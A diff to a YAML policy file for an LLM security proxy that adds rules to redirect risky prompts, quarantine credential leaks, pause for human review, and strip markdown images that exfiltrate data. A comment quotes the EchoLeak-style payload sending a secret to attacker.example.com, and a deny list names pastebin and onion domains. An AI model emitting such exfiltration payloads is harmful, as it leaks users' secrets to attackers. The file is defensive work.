@@ -124,7 +124,67 @@ ingress_rules:
         match_type: exact
         value: "code_execution"
 
+  # ---- Reef extension rules (A-4) ----
+  # Each demonstrates one of the four actions Reef implements. They sit at
+  # priorities BELOW the upstream block rules so an obvious credential leak
+  # or harm request still wins. Enable with --enable-reef.
+
+  # REDIRECT: route high-risk requests to a smaller local model (a Gemma
+  # stub on localhost) instead of denying outright. Lets the demo continue
+  # without leaking data and keeps the conversation alive for the user.
+  - name: redirect_high_risk_to_local_model
+    description: "Reef REDIRECT — route high-risk prompts to a local Gemma fallback"
+    priority: 65
+    action: REDIRECT
+    redirect_target_band: high
+    conditions:
+      - field: risk_score
+        match_type: threshold
+        value: 0.7
+
+  # QUARANTINE: hold conversations whose ingress prompt leaks credentials.
+  # Operator review queue (Phase 2) decides whether to release or deny.
+  - name: quarantine_credential_leak
+    description: "Reef QUARANTINE — hold prompts that contain credentials for human review"
+    priority: 60
+    action: QUARANTINE
+    deny_message: "[REEF] Prompt held for human review — credential exposure detected."
+    conditions:
+      - field: contains_credentials
+        match_type: boolean
+        value: true
+
+  # HUMAN_REVIEW: pause + webhook when DAST-A's EWMA score over OWASP ASI
+  # categories crosses a threshold. The score is populated by A-6 (SVID +
+  # session/ewma package); until A-6 lands the field defaults to 0.0 so
+  # this rule is effectively dormant in production but visible to operators
+  # who want to dry-run the wiring.
+  - name: human_review_novel_attack_pattern
+    description: "Reef HUMAN_REVIEW — pause when multi-turn ASI EWMA exceeds threshold"
+    priority: 55
+    action: HUMAN_REVIEW
+    conditions:
+      - field: asi_category_ewma
+        match_type: threshold
+        value: 0.6
+
 egress_rules:
+  # Reef MODIFY action (A-4): strips markdown images whose destination host
+  # is not on network.allowed_domains. This is the EchoLeak block: the
+  # `![](https://attacker.example.com/log?d=<secret>)` payload gets rewritten
+  # into `[REDACTED: markdown image to attacker.example.com stripped by Reef
+  # MODIFY]` before the response leaves the proxy. Requires --enable-reef;
+  # vanilla Lobster Trap logs the match but leaves the body intact.
+  - name: strip_markdown_image_exfil
+    description: "EchoLeak — strip markdown-image exfil to untrusted domains"
+    priority: 110
+    action: MODIFY
+    modify_strategy: strip_markdown_images_to_untrusted_domains
+    conditions:
+      - field: contains_markdown_image_with_external_url
+        match_type: boolean
+        value: true
+
   - name: block_credential_leak
     description: "Model output contains credentials"
     priority: 100
@@ -158,6 +218,22 @@ network:
   denied_domains:
     - "*.onion"
     - "pastebin.com"
+  # Reef REDIRECT targets (A-4). Keyed by `redirect_target_band` on the rule.
+  # Defaults point at a localhost stub; the Stage UI (Phase 2) hosts the real
+  # mock. Override via REEF_REDIRECT_TARGET env var (used as a fallback when
+  # no band matches).
+  redirect_targets:
+    low: "http://localhost:8765/gemma-stub-low"
+    medium: "http://localhost:8765/gemma-stub-medium"
+    high: "http://localhost:8765/gemma-stub-high"
+
+# Reef notifications (A-4). Used by the HUMAN_REVIEW action to POST request
+# context to an approval queue. Override via REEF_HUMAN_REVIEW_WEBHOOK env
+# var. Defaults to the Stage UI's stub endpoint.
+notifications:
+  human_review_webhook: "http://localhost:8766/approval-queue"
+  human_review_timeout_ms: 1500
+  human_review_retry_after_seconds: 30
 
 filesystem:
   denied_paths:
